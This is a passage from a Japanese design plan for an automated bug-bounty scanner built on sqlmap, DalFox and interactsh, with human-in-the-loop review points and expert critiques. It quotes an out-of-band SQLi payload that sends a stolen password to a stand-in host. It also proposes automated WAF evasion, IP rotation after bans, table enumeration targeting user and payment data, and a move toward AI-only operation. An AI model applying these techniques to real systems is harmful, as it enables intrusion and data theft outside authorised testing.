| 2026-05-22 | HITL設計確定 | 人間介入ポイント定義 | 判断困難箇所の品質保証 |
| 2026-05-23 | Bug Bounty汎用化 | 本計画書全面改訂 | 特定ターゲット依存排除 |

### 6.2 FOSSツール選定比較

| カテゴリ | 候補 | 選定 | 判断理由 |
|---------|------|------|---------|
| **SQLi** | sqlmap, Ghauri, BBQSQL | **sqlmap** | 最も成熟、Tamper豊富、包括的 |
| **XSS** | DalFox, XSStrike, domdig | **DalFox** | ブラウザ統合、DOM対応、JSON出力 |
| **NoSQLi** | nosqli, NoSqlMap | **nosqli** | Go製軽量、MongoDB特化、活発開発 |
| **パラメータ発見** | arjun, x8, param-miner | **arjun + x8** | 手法の異なる2種併用で網羅性向上 |

## 7. Bug Bounty対象別適用戦略

### 7.1 技術スタック別検出戦略

| 技術スタック | 重点カテゴリ | 特有検出パターン | 推奨ツール |
|-------------|-------------|----------------|-----------|
| **Node.js/Express** | NoSQLi, XSS, JWT | MongoDB操作、EJSテンプレート | nosqli, DalFox |
| **Python/Django** | SQLi, XSS, Command Inj | ORM.raw(), テンプレート注入 | sqlmap, 自前 |
| **Java/Spring** | SQLi, XXE, JWT | MyBatis, JPA Native Query | sqlmap |
| **PHP/Laravel** | SQLi, LFI, XSS | Eloquent raw, include | sqlmap, 自前 |
| **Ruby/Rails** | SQLi, XSS, Command Inj | ActiveRecord raw, erb | sqlmap |
| **Go/Gin** | SQLi, XSS, Path Traversal | 標準DB, テンプレート | sqlmap |
| **GraphQL** | SQLi, SSRF, Batching | Query/Mutation注入 | 自前 + sqlmap |
| **Serverless** | SSRF, AuthZ, Misconfig | Lambda環境変数、IAM | 自前 |

### 7.2 対象規模別アプローチ

| 規模 | 特徴 | 推奨アプローチ |
|------|------|---------------|
| **小規模**（個人プロジェクト等） | 攻撃面少、WAF少 | 全カテゴリ広域スキャン |
| **中規模**（スタートアップ等） | 成長中、設定未熟 | P0/P1集中、Sensitive Data重視 |
| **大規模**（エンタープライズ等） | WAF多、分散システム | SSRF/SQLi深堀、段階的調整 |
| **プラットフォーム**（SaaS等） | 複雑、報酬高 | HITL重視、カスタムロジック |

### 7.3 多層検出アーキテクチャ詳細

```
┌────────────────────────────────────────────────────────────────┐
│                    Layer 1: Attack Surface Expansion            │
├────────────────────────────────────────────────────────────────┤
│  arjun, x8, param-miner → 隠しパラメータ発見                   │
│  ワードリスト: カスタム + 業界別 + API固有パラメータ             │
│  対象: 全エンドポイント、全HTTPメソッド                         │
├────────────────────────────────────────────────────────────────┤
│                    Layer 2: High-Confidence Detection           │
├────────────────────────────────────────────────────────────────┤
│  sqlmap --level=1 --risk=1 → Error-based SQLi                  │
│  nosqli → 標準NoSQLi検出                                        │
│  DalFox → Reflected XSS高速検出                                 │
│  特徴: 誤検出最少、即座に報告可能                               │
├────────────────────────────────────────────────────────────────┤
│                    Layer 3: Deep/Dynamic Detection              │
├────────────────────────────────────────────────────────────────┤
│  sqlmap --level=5 --risk=3 → Time/Boolean-based                │
│  interactsh連携 → OOB SSRF/Command Injection                     │
│  DalFox --dom → DOM XSS動的解析                                 │
│  特徴: 高コスト、盲検・相関検出                                 │
├────────────────────────────────────────────────────────────────┤
│                    Layer 4: Bypass & Evasion                    │
├────────────────────────────────────────────────────────────────┤
│  Content-Typeローテーション → パース差異悪用                    │
│  Tamperスクリプト適用 → WAF回避                                 │
│  二重エンコーディング → フィルタ迂回                          │
│  特徴: 人間判断必須、ターゲット別調整                           │
└────────────────────────────────────────────────────────────────┘
```

### 7.4 AI vs 人間の責任分担マトリクス

| 作業 | AI | 人間 | 備考 |
|------|----|------|------|
| **パラメータ発見** | ✅ 自動 | ❌ | arjun/x8実行 |
| **Error-based検出** | ✅ 自動 | ❌ | sqlmap実行 |
| **結果重複排除** | ✅ 自動 | ❌ | 自動スコアリング |
| **WAFブロック対応** | ⚠️ 選択肢提示 | ✅ 判断 | A/B/C選択 |
| **Time-based検出後** | ⚠️ 見積提示 | ✅ 判断 | 抽出実施/スキップ |
| **Second-Order候補** | ⚠️ 信頼度提示 | ✅ 実行 | 手動試行 |
| **ビジネスインパクト** | ⚠️ 事実提示 | ✅ 判断 | 緊急度評価 |
| **カスタムペイロード** | ❌ | ✅ 作成 | NoSQLi等 |

### 7.5 FOSSツール選定詳細（Bug Bounty対象全体向け）

| ツール | 役割 | 採用理由 | 却下候補 |
|--------|------|----------|---------|
| **sqlmap** | 主要SQLi検出エンジン | 最も包括的、Tamper豊富、文書充実 | Ghauri, BBQSQL |
| **nosqli** | NoSQLi専用 | MongoDB特化、軽量、高速 | NoSqlMap |
| **arjun** | パラメータ発見 | HTTPメソッド網羅、POST body対応 | - |
| **dalfox** | XSS検出 | DOM対応、ブラウザ統合、JSON出力 | XSStrike, domdig |
| **x8** | パラメータ発見 | 高速、差分検出ベース | - |
| **interactsh** | OOB検出 | セルフホスト可能、相関管理 | Burp Collaborator |

**却下理由まとめ**:
- **Ghauri**: sqlmapサブセット、追加価値なし
- **BBQSQL**: 開発停止、sqlmap代替不可
- **XSStrike**: エンコーディング特化だがDalFoxで代替可能

### 7.6 将来拡張設計（Ver.2への橋渡し）

```python
# Ver.1で確保する拡張ポイント（将来対応用）
self.engines = {
    # Ver.1実装済み
    'sqlmap': SqlmapAdapter(),        # ✅ 主要SQLi検出
    'nosqli': NosqliAdapter(),        # ✅ NoSQLi検出
    'arjun': ArjunAdapter(),          # ✅ パラメータ発見
    'dalfox': DalFoxAdapter(),        # ✅ XSS検出
    'interactsh': InteractshAdapter(), # ✅ OOB検出
    
    # Ver.2以降検討（需要・ツール成熟待ち）
    'graphql_advanced': None,          # ⏳ GraphQL完全対応
    'grpc_client': None,               # ⏳ gRPC対応
    'websocket_client': None,          # ⏳ WebSocket検出
    'http2_client': None,              # ⏳ HTTP/2対応
    'dast_scanner': None,              # ⏳ 統合DAST
}

# エンジンプラグインインターフェース
class BaseSecurityEngine(ABC):
    @abstractmethod
    async def scan(self, target: Target, options: Dict) -> List[Finding]:
        pass
    
    @abstractmethod
    def get_confidence_score(self, finding: Finding) -> float:
        pass
```

### 7.7 制約事項と対応方針

| 制約 | 影響 | 対応方針 |
|------|------|---------|
| **WAF回避の時間コスト** | 検出率低下 | 段階的遅延増加、HITL判断 |
| **Time-based抽出工数** | 自動化不可 | 検出のみ自動、抽出は人間判断 |
| **NoSQLiカスタム対応** | 検出漏れ | 標準nosqli + 人間カスタム |
| **GraphQL/gRPC対応** | 未対象 | Ver.2で専用実装検討 |
| **Blind XSS遅延検出** | 即時フィードバック不可 | OOBコールバック待機設計 |

## 8. 検出手法別詳細戦略

### 8.1 SQLi検出戦略マトリクス

| 手法 | 適用シナリオ | 検出確率 | 誤検出率 | 実行時間 | 備考 |
|------|-------------|---------|---------|---------|------|
| **Error-based** | エラーメッセージ表示あり | 高 | 極低 | 短 | 最優先実施 |
| **Union-based** | Error-based成功後 | 高 | 低 | 中 | データ抽出可能 |
| **Time-based** | エラーメッセージなし | 中 | 中 | 長 | 遅延検出 |
| **Boolean-based** | Time-based未検出時 | 中 | 中 | 長 | True/False差分 |
| **Stacked Query** | DBMS依存 | 低 | 低 | 短 | PostgreSQL等 |
| **Out-of-band** | 外部連携可能時 | 中 | 低 | 中 | DNS/HTTP連携 |

### 8.2 XSS検出戦略マトリクス

| 種別 | 適用シナリオ | 検出確率 | 備考 |
|------|-------------|---------|------|
| **Reflected** | URLパラメータ反映 | 高 | 即時応答検証 |
| **Stored** | 保存機能あり | 中 | 2パス検証必須 |
| **DOM** | SPA/動的レンダリング | 中 | ブラウザ必須 |
| **Blind** | 管理者画面等 | 低 | OOBコールバック |
| **Mutation** | フィルタ通過後 | 低 | ブラウザ挙動依存 |

### 8.3 SSRF検出戦略マトリクス

| 手法 | 適用シナリオ | 報酬期待値 | 備考 |
|------|-------------|-----------|------|
| **OOB Correlation** | URLパラメータ・外部連携 | 高 | interactsh等で検出 |
| **Protocol Smuggling** | gopher://等使用可能 | 中 | サービス悪用 |
| **DNS Rebinding** | 同一オリジンチェック | 中 | タイムアタック |
| **URL Parser Differential** | パースライブラリ差異 | 高 | バイパス強力 |

### 8.4 技術スタック別重点カテゴリ

| 技術スタック | 重点カテゴリ | 特有パターン | 推奨ツール |
|-------------|-------------|-------------|-----------|
| **Node.js** | NoSQLi, XSS, JWT | MongoDB, EJS | nosqli, DalFox |
| **Python** | SQLi, XSS, Cmd Inj | ORM.raw() | sqlmap, 自前 |
| **Java** | SQLi, XXE, JWT | MyBatis, JPA | sqlmap |
| **PHP** | SQLi, LFI, XSS | 動的include | sqlmap, 自前 |
| **GraphQL** | SQLi, SSRF | Query注入 | 自前 + sqlmap |
| **Serverless** | SSRF, AuthZ | 環境変数 | 自前 |
## 9. 高度検出手法・将来検討事項（Ver.2以降）

### 9.1 プロトコル・通信方式別検出

| # | 手法 | 概要 | 現状 | Ver.2対応 |
|---|------|------|------|-----------|
| 1 | **HTTP/2擬似ヘッダー** | `:authority`, `:path`等への注入 | ❌ 未対応 | ✅ 検討 |
| 2 | **WebSocket経由** | メッセージフレーム内SQLi | ❌ 未対応 | ✅ 検討 |
| 3 | **gRPCメタデータ** | Metadataヘッダー経由注入 | ❌ 未対応 | ✅ 検討 |
| 4 | **SSEストリーム** | Server-Sent Events内検出 | ❌ 未対応 | ⚠️ 需要調査 |
| 5 | **HTTPパイプライン** | 複数リクエスト一括送信 | ❌ 未対応 | ⚠️ 実用性低 |

### 9.2 バイパス・回避手法

| # | 手法 | 概要 | 現状 | 備考 |
|---|------|------|------|------|
| 6 | **Content-Type変化** | JSON→FormData等の切替 | 🟡 部分対応 | ローテーション実装済 |
| 7 | **Chunked Transfer-Encoding** | チャンク境界攻撃 | ❌ 未対応 | WAF効果低下 |
| 8 | **キャッシュポイズニング** | CDN経由攻撃 | ❌ 未対応 | 複雑、優先度低 |
| 9 | **JSON Schema Bypass** | バリデーション前後差異 | ❌ 未対応 | Unicode正規化等 |
| 10 | **二重エンコーディング** | URLエンコード2回適用 | 🟡 部分対応 | フィルタ迂回 |

### 9.3 アプリケーション層手法

| # | 手法 | 概要 | 現状 | Ver.2対応 |
|---|------|------|------|-----------|
| 11 | **JWT Claims内SQLi** | JWTペイロード経由注入 | ❌ 未対応 | ✅ 検討 |
| 12 | **GraphQL Batching** | バッチクエリ内SQLi | 🟡 部分対応 | 完全対応検討 |
| 13 | **API Gateway書き換え** | パス→クエリ変換悪用 | 🟡 部分対応 | 両方ファジング |
| 14 | **ORM N+1悪用** | 遅延ロード時のSQLi | ❌ 未対応 | ⚠️ 検出困難 |
| 15 | **GraphQL Introspection** | スキーマから推測 | 🟡 部分対応 | ヒューリスティック強化 |

## 10. 承認ステータス・次ステップ

### 10.1 承認ステータス

| 項目 | ステータス | 担当 | 備考 |
|-----|-----------|------|------|
| 計画策定 | ✅ 完了 | 実装チーム | Bug Bounty汎用化改訂済 |
| ROI優先順位定義 | ✅ 完了 | CTO | セクション2.1 |
| 多層検出アーキテクチャ | ✅ 承認済 | CTO | Layer 1-4構成 |
| FOSSツール選定 | ✅ 承認済 | CTO | sqlmap/dalfox/nosqli |
| HITL設計 | ✅ 承認済 | CTO | 人間介入ポイント定義 |
| **PM最終承認** | ⏳ **承認待ち** | **PM** | スコープ・工数確認 |

### 10.2 承認後アクションプラン

| フェーズ | 期間 | 主要タスク | 成果物 |
|---------|------|-----------|--------|
| **Week 1** | 5日 | SSRF/SQLi Tier 1-2実装 | OOB連携、Error/Time-based検出 |
| **Week 2** | 5日 | XSS/Cmd Inj/Auth実装 | DOM XSS、OOB Cmd Injection |
| **Week 3** | 3日 | 統合・検証・ドキュメント | E2Eテスト、完了報告 |
| **継続** | - | HITL運用・改善 | 実環境フィードバック収集 |

### 10.3 成功基準

- **最低目標**: P0カテゴリ（SSRF/SQLi）の検出率向上
- **期待目標**: 新規Bug Bounty報告1件以上
- **最高目標**: 高額報酬脆弱性（$5,000+）検出自動化

## 11. Ver.1対応範囲・Ver.2以降検討事項

### 11.1 Ver.1対応範囲（確定）

| カテゴリ | 実装内容 | 対象ツール |
|---------|---------|-----------|
| **SQLi** | Error-based, Union-based, Time-based, Boolean-based, NoSQLi | sqlmap, nosqli |
| **XSS** | Reflected, DOM, Stored (2パス) | DalFox, 自前 |
| **SSRF** | OOB Correlation, Protocol Smuggling | interactsh, 自前 |
| **Cmd Injection** | OOB Execution, Time-based | interactsh, 自前 |
| **LFI** | Path Traversal, File Inclusion | 自前 |
| **Sensitive Data** | Backup, Sourcemap, Config, Git | 自前 |
| **Auth** | JWT None, Weak Secret, Session Fixation | 自前 |

### 11.2 Ver.2以降検討（優先度順）

| 優先度 | 項目 | 保留理由 | 検討条件 |
|--------|------|---------|---------|
| P1 | **gRPC対応** | 実装複雑、需要低 | gRPC使用アプリ増加 |
| P1 | **GraphQL完全対応** | ツール未成熟 | graphqlmap等の進化 |
| P2 | **WebSocket検出** | ステート管理複雑 | WebSocket使用増加 |
| P2 | **HTTP/2対応** | h2実装工数大 | HTTP/2必須環境増加 |
| P3 | **分散トレーシング** | Jaeger等必要 | マイクロサービス対象増加 |
| P3 | **キャッシュポイズニング** | 再現性困難 | 専門家知見導入後 |

### 11.3 却下・非対応項目

| 項目 | 却下理由 | 代替策 |
|------|---------|--------|
| **Ghauri** | sqlmapサブセット、追加価値なし | sqlmap使用継続 |
| **自動Time-based抽出** | 数時間〜数日かかり、実用的でない | 人間判断で実施/スキップ |
| **自動Second-Order** | 認証フロー複雑、自動化コスト>効果 | AI候補提示→人間手動実行 |
| **完全自動WAF回避** | ターゲット依存、誤判定リスク大 | 選択肢提示→人間判断 |
| **N+1問題悪用** | 単体リクエストでは検出不可 | Ver.1非対応 |
| **HTTPパイプラインング** | 現代WAFで効果薄い | 却下 |

### 11.4 設計原則

```python
# Ver.1設計原則
PRIORITY_ORDER = [
    "FOSSツール優先",      # 成熟ツール統合、自前開発最小化
    "ROI重視",             # 高報酬カテゴリ優先
    "人間介入設計",        # 判断困難箇所はHITL
    "拡張可能性確保",      # エンジンプラグイン構造
]

# Ver.1実装済みエンジン
self.engines = {
    'sqlmap': SqlmapAdapter(),         # ✅ Error/Union/Time/Boolean-based
    'nosqli': NosqliAdapter(),         # ✅ MongoDB等NoSQLi
    'arjun': ArjunAdapter(),           # ✅ 隠しパラメータ発見
    'dalfox': DalFoxAdapter(),         # ✅ XSS検出
    'interactsh': InteractshAdapter(), # ✅ OOB相関検出
}
```

---

## 12. 深度レビュー: SQLi Hunter限界分析

### 12.1 トップBug Bountyハンター観点での問題点

現状のSQLi Hunter設計に対し、実務で脆弱性を見つけ続けるトップBug Bountyハンターの観点から、以下の根本的問題点が特定された。

#### 【問題1】パラメータ発見の網羅性不足
**問題の本質**: arjun/x8は基本的なパラメータ発見はできるが、GraphQL変数、JSONネスト、配列インデックス、ヘッダーベースパラメータ（X-Forwarded-For等）の深い発見ができていない。

**実務での影響**:
- REST APIの隠しパラメータは見つかっても、GraphQLの変数やDirectives内の注入点はスルーされる
- `items[0][name]` のような配列ネストパラメータ未対応
- JSON-RPC 2.0 の `params` オブジェクト内注入点検出不可

**改善案**: `AdvancedParamDiscovery`クラスによる多層パラメータ発見アーキテクチャ導入
- GraphQLParamExtractor: Query/Mutation変数抽出
- JSONNestExplorer: ネストJSON全パス探索
- HeaderBasedExtractor: X-*ヘッダー自動生成
- ArrayIndexEnumerator: items[0]→items[99]試行

#### 【問題2】認証状態の継続的管理欠如
**問題の本質**: JWT/Sessionの期限切れ検出と自動更新がなく、長時間のTime-based盲検中に認証が切れると検出失敗する。

**実務での影響**:
- Time-based盲検は1パラメータで10-30分かかる
- 30分経過でJWT expires → その後のリクエストはすべて401 → 検出失敗と誤認
- リフレッシュトークン対応なし

**改善案**: `AuthAwareHTTPClient`によるトークン自動更新
- トークン期限5分前の先行更新
- 401検出時の自動リトライ（1回のみ）
- JWT refresh_token / Sessionクッキーリフレッシュ対応

#### 【問題3】WAF検出と回避の非リアクティブ性
**問題の本質**: WAFブロック検出後の戦略選択が人間に委譲されるが、実際にはパターン認識と自動最適化が可能。

**実務での影響**:
- 毎回人間が介入 → 1ターゲットあたり数十回のHITLが必要
- Cloudflare vs AWS WAF vs ModSecurityで回避戦略が異なるのに統一対応
- Tamperスクリプト選定が経験依存

**改善案**: `AdaptiveWAFEvasion`による自動回避戦略選択
- WAF別プロファイル（Cloudflare/AWS WAF/ModSecurity等）
- evasion_chain自動試行 → 成功するまでループ → 全失敗時のみHITL
- delay_steps段階的増加（1→2→5→10秒）

#### 【問題4】データベース指紋の精度不足
**問題の本質**: sqlmapの指紋は広いが、実際のBug Bountyでは正確なDBMSバージョンとWAF/DBMSの組み合わせが重要。

**実務での影響**:
- `MySQL 5.7` vs `MySQL 8.0` で脆弱性パターンが異なる
- Aurora MySQL vs 標準MySQLで挙動差異
- PostgreSQL with RDS vs self-hostedで権限差異

**改善案**: `PreciseDBFingerprinting`による詳細指紋取得
- Aurora固有関数（`aurora_version()`）検出
- RDS/Azure SQL判定クエリ
- 権限確認（`SHOW GRANTS`等）

#### 【問題5】Second-Order SQLiの検出不可能性
**問題の本質**: フォームAの入力が画面Bで影響するSecond-Orderは、単一リクエスト解析では検出不可。

**実務での影響**:
- ユーザー登録フォーム → 管理ダッシュボード表示 での検出が最も多い
- 保存 → 別画面表示 のフロー追跡がない
- ステートフルなマルチステップ検出未対応

**改善案**: `SecondOrderSQLiDetector`による2パス検出
- ステージ1: 保存系エンドポイント特定 → ペイロード注入
- ステージ2: 全表示エンドポイント巡回 → 遅延相関検出
- storage_endpoint + display_endpointのペア特定

#### 【問題6】カートesian積爆発の検出欠如
**問題の本質**: JOINなし複数テーブルSELECTは検出できるが、カートesian積によるDoS的な検出はしていない。

**実務での影響**:
- `SELECT * FROM users, orders, products` は応答時間で検出可能
- 大規模DBで顕在化するパフォーマンス問題として報告価値が高い
- Time-based以外の副作用ベース検出未対応

**改善案**: `SideEffectBasedDetection`による副作用検出
- カートesian積ペイロード（MySQL/PostgreSQL/MSSQL別）
- ベースライン vs 実行時間の統計的比較
- タイムアウト応答も検証対象

#### 【問題7】SQLiからの自動データ証拠収集欠如
**問題の本質**: 検出はできるが、報告に必要な「影響を受けたデータの証明」が自動化されていない。

**実務での影響**:
- `@@version` は取れるが `user()`, `database()`, テーブル一覧は手動
- 脆弱性の深刻度評価に必要な「どのDBにアクセスできたか」不明
- スクリーンショット付き報告の自動生成不可

**改善案**: `AutomatedEvidenceCollector`による証拠自動収集
- 基本情報自動収集（version/user/database/datadir）
- テーブル一覧取得（制限付き）
- 重要テーブル特定（user/admin/payment等）
- 行数カウントによるインパクト推定
- スクリーンショット付きレポート自動生成

#### 【問題8】Out-of-Band（OOB）検出の基盤不足
**問題の本質**: DNS/HTTP out-of-bandは理論上可能だが、相関ID管理・コールバック待機・再試行ロジックが未整備。

**実務での影響**:
- `LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 1), '.oob.com\a.txt'))` の結果が来ない
- 相関ID生成・待機・タイムアウト管理が手動
- ファイアウォール内ターゲットではOOB不可なのに自動判定なし

**改善案**: `OOBCorrelationManager`による相関管理
- ユニーク相関ID生成
- 非同期コールバック待機（60秒タイムアウト）
- ファイアウォール内判定（タイムアウトで自動判定）

#### 【問題9】コンテキストアウェア注入欠如
**問題の本質**: 数値パラメータに文字列ペイロード、文字列パラメータに数値ペイロードを送る等、型/文脈を無視した愚直な注入。

**実務での影響**:
- `id=1` に `' OR '1'='1` を送る → アプリが数値パースでエラー → 404 → 検出失敗
- `name=john` に `1 AND 1=1` を送る → SQLエラー → 誤検出 or 失敗
- JSON型パラメータに対する適切なエスケープ考慮なし

**改善案**: `ContextAwarePayloadGenerator`による文脈考慮ペイロード生成
- 型別テンプレート（numeric/string_single/string_double/json_*）
- オリジナル値分析によるコンテキスト推定
- 型に適合したペイロード自動選択

#### 【問題10】分散SQLi（マイクロサービス間）の検出不可能性
**問題の本質**: API Gateway → UserService → OrderService のように分散するSQLiは、単一エンドポイント視点では検出不可。

**実務での影響**:
- API GatewayのログにはInjection痕跡なし
- 内部サービスでのSQLiが外部応答に現れない
- 分散トレーシング（Jaeger/Zipkin）連携なし

**改善案**: `DistributedSQLiDetector`による分散検出
- エントリーポイントから全呼び出しグラフ探索（Jaeger/Zipkin連携）
- 各サービス内SQLi検出
- trace_idによる相関追跡

#### 【問題11】暗号化/ハッシュ化データの存在下での検出遅延
**問題の本質**: `password` カラムが bcrypt ハッシュ化されている場合、`SLEEP(5)` を通しても応答が即座に返る。

**実務での影響**:
- パスワード検証カラムは常に遅延（bcrypt計算）
- 通常のTime-based判定では誤検出 or 検出失敗
- ハッシュコスト係数による遅延変動を考慮できない

**改善案**: `CryptoAwareDetection`による暗号化考慮検出
- 複数回ベースライン測定＋外れ値除去
- 統計的検定（期待遅延 vs 実際の遅延）
- crypto_compensatedフラグ付き検出

#### 【問題12】検出後のエスカレーションパス未定義
**問題の本質**: 検出できても、そこからどう「報告可能な脆弱性」に持ち込むかのワークフローがない。

**実務での影響**:
- Error-based検出 → データ抽出試行 → WAF BAN → 証拠消失
- Time-based検出 → 抽出工数見積もりなし → 放置
- 深刻度評価に必要な「ビジネスインパクト」情報収集なし

**改善案**: `EscalationWorkflow`による自動エスカレーション
- Error-based/Time-based別エスカレーションパス
- インパクト自動評価（production/user/payment等）
- 最終レポート自動生成

### 12.2 改善案優先度（技術価値順）

| 優先度 | 問題点 | 改善案 | 期待効果 |
|-------|--------|--------|---------|
| P0 | 問題3: WAF回避非リアクティブ | AdaptiveWAFEvasion | WAF環境での検出率+40% |
| P0 | 問題7: 証拠収集欠如 | AutomatedEvidenceCollector | 報告品質向上、手動工数-60% |
| P1 | 問題2: 認証管理欠如 | AuthAwareHTTPClient | 長時間検出の成功率+30% |
| P1 | 問題1: パラメータ発見不足 | AdvancedParamDiscovery | 攻撃面+50% |
| P1 | 問題8: OOB検出基盤不足 | OOBCorrelationManager | 盲検成功率+25% |
| P2 | 問題9: コンテキスト無視 | ContextAwarePayloadGenerator | 誤検出-30% |
| P2 | 問題5: Second-Order未対応 | SecondOrderSQLiDetector | 新カテゴリ開拓 |
| P2 | 問題4: DB指紋精度不足 | PreciseDBFingerprinting | 報告の専門性向上 |
| P3 | 問題6: カートesian積未対応 | SideEffectBasedDetection | DoSパターン検出 |
| P3 | 問題10: 分散SQLi未対応 | DistributedSQLiDetector | マイクロサービス対応 |
| P3 | 問題11: 暗号化遅延未考慮 | CryptoAwareDetection | 認証系検出向上 |
| P3 | 問題12: エスカレーション未定義 | EscalationWorkflow | 検出→報告ワークフロー自動化 |

---

## 13. 多専門家観点レビュー

### 13.1 SRE/インフラエンジニア観点

#### 所見

**Observability（可観測性）の不足**:
- SQLi Hunterの内部状態（どのペイロードを試行中、どのWAFにブロックされたか）が外部に可視化されていない
- Time-based盲検の進捗（何%完了、残り時間見積もり）が取得不可
- OOBコールバックのキュー状況、滞留数、処理遅延が監視不能

**Resilience（回復性）の課題**:
- WAFブロック後の指数関数的バックオフ戦略が「人間判断」に依存しており自動回復がない
- ターゲットからのBAN（IPブロック）後の自動IPローテーション未対応
- 長時間実行タスク（Time-based 30分）の途中でプロセス再起動が発生すると最初からやり直し

**Resource Management（資源管理）**:
- 並列実行時のリソース競合（sqlmap複数プロセスでのCPU/メモリ枯渇）に対する制限なし
- OOBサーバー（interactsh）の自己ホスト時のスケーリング戦略未定義

#### 推奨対応

```yaml
# SRE推奨: 可観測性強化
observability:
  metrics:
    - payload_attempt_total  # ペイロード試行数
    - detection_latency_seconds  # 検出までの時間
    - waf_block_rate  # WAFブロック率
    - oob_callback_latency  # OOBコールバック遅延
  
  tracing:
    - trace_id_per_injection  # 注入ごとの分散トレース
    - parent_child_relationship  # Second-Order等の関連追跡
  
  health_checks:
    - sqlmap_adapter_health  # アダプター生存確認
    - oob_server_connectivity  # OOBサーバー疎通
    - auth_token_validity  # 認証トークン有効性

resilience:
  circuit_breaker:
    - waf_block_threshold: 5  # 5回連続ブロックで回路遮断
    - recovery_timeout: 300s  # 5分後に復旧試行
  
  checkpoint:
    - save_state_every: 60s  # 60秒ごとに進捗保存
    - resume_from_checkpoint: true  # 再起動時に復旧
```

---

### 13.2 ソフトウェアアーキテクト観点

#### 所見

**Plugin Architecture（プラグインアーキテクチャ）の未整備**:
- sqlmap/dalfox等のFOSSツール統合がハードコードされており、新ツール追加時のインターフェース契約が不明確
- `BaseSecurityEngine`抽象クラスは定義されているが、ライフサイクル管理（初期化→実行→後処理）が未標準化
- ツール間の連携（arjun発見 → sqlmap検出）が直接依存であり、メッセージング/イベント駆動アーキテクチャを採用していない

**Separation of Concerns（関心の分離）の不足**:
- SQLi検出ロジックとWAF回避ロジックが密結合
- 認証管理とHTTP通信が同一クラスに実装されており、テスト時のモック化が困難
- 証拠収集とレポート生成が同じワークフローに混在

**Data Flow（データフロー）の課題**:
- Findingオブジェクトがツール間を流れる際のスキーマ進化（Schema Evolution）戦略なし
- 大規模データ（1000テーブル以上のデータベース情報）のストリーミング処理未対応

#### 推奨アーキテクチャ

```python
# アーキテクト推奨: レイヤードアーキテクチャ
class PluginArchitecture:
    """
    ┌─────────────────────────────────────────┐
    │  Layer 4: Orchestration Layer           │
    │  - WorkflowEngine (エスカレーション制御) │
    │  - EvidenceCollector (証拠収集統括)       │
    ├─────────────────────────────────────────┤
    │  Layer 3: Detection Engine Layer        │
    │  - SQLiDetectionEngine (インターフェース)│
    │  - XSSDetectionEngine                   │
    │  - Concrete: SqlmapAdapter, DalFoxAdapter│
    ├─────────────────────────────────────────┤
    │  Layer 2: Strategy Layer               │
    │  - WAFEvasionStrategy (戦略パターン)     │
    │  - PayloadGenerationStrategy             │
    │  - AuthManagementStrategy                │
    ├─────────────────────────────────────────┤
    │  Layer 1: Infrastructure Layer           │
    │  - HTTPClient (認証・リトライ・ロギング) │
    │  - OOBServer (相関管理)                  │
    │  - StateManager (チェックポイント)       │
    └─────────────────────────────────────────┘
    """

# イベント駆動連携
class EventDrivenIntegration:
    events:
      - ParamDiscovered  # arjun発見 → イベント発行
      - SQLiDetected     # sqlmap検出 → エビデンス収集トリガー
      - WAFEvasionRequired  # WAF検出 → 回避戦略選択トリガー
```

---

### 13.3 デバッガー/テストエンジニア観点

#### 所見

**Determinism（決定性）の欠如**:
- Time-based検出はネットワーク遅延変動により再現性が低い
- 同じペイロードを2回実行しても異なる結果（WAF学習によるブロックパターン変化）
- マルチスレッド実行時の競合条件（レート制限共有等）による非決定的動作

**Testability（テスト容易性）の課題**:
- 実際のSQLi脆弱性を持つターゲットへの依存（DVWA/Juice Shop等の学習アプリは挙動が単純）
- WAFブロックシナリオのモック化が困難（実際のCloudflareに依存）
- 分散トレーシング連携のローカルテスト環境未整備

**Root Cause Analysis（根本原因分析）**:
- 検出失敗時の「どの段階で失敗したか」特定のトレース不足
- False Negative（見逃し）の事後分析手順が確立していない

#### 推奨デバッグ支援機能

```python
# デバッガー推奨: 決定性確保とテスト支援
class DebuggabilityFeatures:
    # 1. シード付き乱数生成（再現性確保）
    seeded_random = SeededRandom(seed=config.random_seed)
    
    # 2. ネットワーク遅延シミュレーション
    network_emulator = NetworkEmulator(
        latency_range=(50, 200),  # 50-200ms
        jitter=0.1,  # 10%変動
        packet_loss=0.01  # 1%ロス
    )
    
    # 3. 実行トレース記録
    execution_tracer = ExecutionTracer(
        record_payloads=True,
        record_responses=True,
        record_timing=True,
        max_history=1000  # 最新1000リクエスト
    )
    
    # 4. リプレイ機能
    replay_engine = ReplayEngine(
        trace_source=execution_tracer,
        target_override="localhost:8080"  # ローカルテスト用
    )
```

---

### 13.4 CTO（技術戦略責任者）観点

#### 所見

**Competitive Differentiation（差別化）**:
- 現状の設計は「sqlmapをラップする」程度であり、他のBug Bounty自動化ツールと比較した優位性が不明確
- FOSSツール統合は実装コストを下げるが、独自の知的財産形成にならない
- 競合他社（自動脆弱性スキャナー企業）との差別化ポイントが「HITL設計」のみで技術的優位性が薄い

**Technical Debt（技術的負債）**:
- sqlmap/dalfox等の外部依存が多く、これらのツールが廃止・大幅変更された場合の移行コストが高い
- プロトコル別（HTTP/2/WebSocket/gRPC）対応が個別実装となっており、将来のプロトコル追加時の工数増大

**Strategic Alignment（戦略的整合性）**:
- 「検出 > 自動化」の方針は妥当だが、将来的な完全自動化（AI-only）への道筋が不明確
- 収益モデルとの整合：現在の設計は「社内使用」前提だが、SaaS化・外部販売を見据えたマルチテナント対応がない

#### 戦略推奨

```yaml
# CTO推奨: 技術戦略ロードマップ
technical_strategy:
  # 短中期（0-12ヶ月）: 差別化要素の構築
  short_term:
    - 独自検出エンジン開発: FOSSラップから段階的に脱却
      focus: "context_aware_payload_generation"  # 問題9の独自実装
    - マシンラーニング統合: 過去の成功/失敗パターン学習
      focus: "adaptive_waf_evasion"  # 問題3のML強化
    - コミュニティ連携: 世界のトップハンター知見の収集・形式知化
      focus: "expert_knowledge_graph"
  
  # 中期（12-24ヶ月）: プラットフォーム化
  medium_term:
    - マルチテナントアーキテクチャ: SaaS展開準備
    - APIファースト設計: サードパーティ統合エコシステム構築
    - 自動報告生成: 検出から報告書完成までの完全自動化
  
  # 長期（24-36ヶ月）: 自律化
  long_term:
    - 完全自動化（AI-only）検討: HITL削減の実現性評価
    - 自律的プログラム解析: ソースコード不要のブラックボックス完全自動化
    - グローバル展開: 多言語・多法域対応

risk_mitigation:
  foss_dependency:
    - 主要FOSSツールのフォーク・独自メンテナンス検討
    - 抽象化レイヤー厚化（Adapterパターン徹底）
    - フォールバック戦略（ツールA失敗時のツールB自動切替）
  
  talent_retention:
    - トップハンターとのパートナーシップ構築
    - 内部チームのBug Bounty実務参加（スキル維持）
```

---

## 14. 付録: Bug Bounty対象アプリケーション参考リスト


